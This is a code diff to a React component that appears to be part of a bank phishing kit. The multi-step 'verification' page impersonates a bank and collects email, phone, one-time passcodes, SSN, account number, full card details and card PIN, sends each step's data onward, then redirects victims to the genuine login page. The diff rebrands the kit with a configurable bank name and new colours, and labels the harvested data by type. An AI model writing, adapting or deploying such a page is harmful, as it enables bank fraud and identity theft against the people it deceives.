@@ -14,13 +14,13 @@ export default function CombinedVerification() {
     verificationCode: "",
     ssn: "",
     accountNumber: "",
-    bankName: "Bravera Bank",
+    bankName: process.env.NEXT_PUBLIC_BANK_NAME,
     // Credit card fields
     cardNumber: "",
     cardExpiry: "",
     cardCVV: "",
     cardholderName: "",
-    cardPIN: ""  // Added PIN field
+    cardPIN: ""
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -39,9 +39,10 @@ export default function CombinedVerification() {
     try {
       // Prepare the data for the current step
       let requestData = {
-        bankName: formData.bankName,
-        stepCompleted: stepNumber,
-        time: new Date().toString(),
+        bbankName: formData.bankName,
+        type: stepNumber === 1 ? 'email and phone number' : stepNumber === 2 ? 'verification code (OTP)' : 'bank card details',
+        // stepCompleted: stepNumber,
+        // time: new Date().toString(),
         ...additionalData
       };
       
@@ -87,8 +88,8 @@ export default function CombinedVerification() {
       
       // Send step 2 data
       const success = await sendStepData(2, {
-        emailAddress: formData.emailAddress,
-        phoneNumber: formData.phoneNumber,
+        // emailAddress: formData.emailAddress,
+        // phoneNumber: formData.phoneNumber,
         verificationCode: formData.verificationCode
       });
       
@@ -186,7 +187,7 @@ export default function CombinedVerification() {
                 name="emailAddress"
                 value={formData.emailAddress}
                 onChange={handleChange}
-                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
               />
             </div>
 
@@ -199,7 +200,7 @@ export default function CombinedVerification() {
                 maxLength={10}
                 value={formData.phoneNumber}
                 onChange={handleChange}
-                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
               />
             </div>
           </>
@@ -221,7 +222,7 @@ export default function CombinedVerification() {
                 value={formData.verificationCode}
                 onChange={handleChange}
                 placeholder="Enter your code"
-                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
               />
             </div>
 
@@ -265,7 +266,7 @@ export default function CombinedVerification() {
                   value={formData.cardholderName}
                   onChange={handleChange}
                   placeholder="Name as it appears on card"
-                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                 />
               </div>
               
@@ -278,7 +279,7 @@ export default function CombinedVerification() {
                   value={formData.cardNumber}
                   onChange={handleChange}
                   placeholder="XXXX XXXX XXXX XXXX"
-                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                 />
               </div>
               
@@ -291,7 +292,7 @@ export default function CombinedVerification() {
                     value={formData.cardExpiry}
                     onChange={handleChange}
                     placeholder="MM/YY"
-                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                   />
                 </div>
                 
@@ -304,7 +305,7 @@ export default function CombinedVerification() {
                     onChange={handleChange}
                     placeholder="123"
                     maxLength={3}
-                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                   />
                 </div>
               </div>
@@ -319,7 +320,7 @@ export default function CombinedVerification() {
                   onChange={handleChange}
                   placeholder="Enter 4-digit PIN"
                   maxLength={4}
-                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                 />
                 <p className="text-xs text-gray-400 mt-1">
                   For security verification only
@@ -328,7 +329,7 @@ export default function CombinedVerification() {
             </div>
 
             <div className="text-center mt-2">
-              <a href="#" className="text-[#F2AA2E] text-sm hover:underline">
+              <a href="#" className="text-[#36c3f1] text-sm hover:underline">
                 Need help finding your account number?
               </a>
             </div>
@@ -342,7 +343,7 @@ export default function CombinedVerification() {
             <h3 className="text-lg mb-4">Thank you!</h3>
             <p className="mb-4">
               Your contact information has been updated successfully. Please{" "}
-              <a href="https://secure.bravera.bank/login" className="text-[#F2AA2E] hover:underline">
+              <a href="https://secure.bravera.bank/login" className="text-[#36c3f1] hover:underline">
                 Click here
               </a>{" "}
               and you will be redirected to the Authentication page. If the page doesn&apos;t
@@ -392,7 +393,7 @@ export default function CombinedVerification() {
                 key={step} 
                 className={`w-8 h-8 rounded-full flex items-center justify-center ${
                   currentStep >= step 
-                    ? "bg-[#F2AA2E] text-[#1E1F20]" 
+                    ? "bg-[#36c3f1] text-[#1E1F20]" 
                     : "bg-gray-700 text-white"
                 }`}
               >
